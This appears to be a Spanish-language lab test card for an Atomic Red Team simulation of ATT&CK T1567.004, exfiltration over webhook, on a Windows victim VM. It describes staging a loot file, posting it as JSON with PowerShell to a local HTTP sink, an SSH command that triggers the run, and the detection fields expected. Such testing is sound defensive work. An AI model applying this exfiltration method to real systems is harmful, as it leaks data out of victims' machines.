# ATA057 - T1567.004 Exfiltration Over Webhook (Windows, `victima-windows`)

> **B1.1 (piloto mixto).** Canal **SSH**. **ART tal cual**: `T1567.004` ->
> *Exfiltrate staged data to a Discord webhook (PowerShell)* (`f0057c81-24dc-4a2e-b658-5809c242180b`).

## Que hace

1. Prepara `T1567.004_loot.txt` con el contenido de la atomica.
2. Construye `@{ content = ... } | ConvertTo-Json` y hace `Invoke-RestMethod -Method Post`
   a `http://192.168.65.1:9090/hook/ATA057` (sink HTTP del HOST).
3. Escribe `evidencias/body.json` (bytes exactos enviados), `efecto_local.txt` y `times.log`.

**Adaptacion declarada**: `webhook_url` local y `staged_file` local; el cuerpo se envia como
bytes UTF-8 para demostrar su `sha256` (mismo JSON que el ART). Guardarrail de destino local.

## Ejecucion

```powershell
ssh -i <clave> angel@192.168.65.130 "cmd /c C:\lab-attack\ATA057\run.cmd"
```

## Prueba de efecto

`sink.log`: `POST /hook/ATA057 ... sha256=<hash>` con el `sha256` del cuerpo JSON enviado.
La alerta **no** es prueba de efecto.

## Esperado

`ATA057_esperado.csv`: `win_image` + ancla `win_command_line` con `C:\lab-attack\ATA057`.
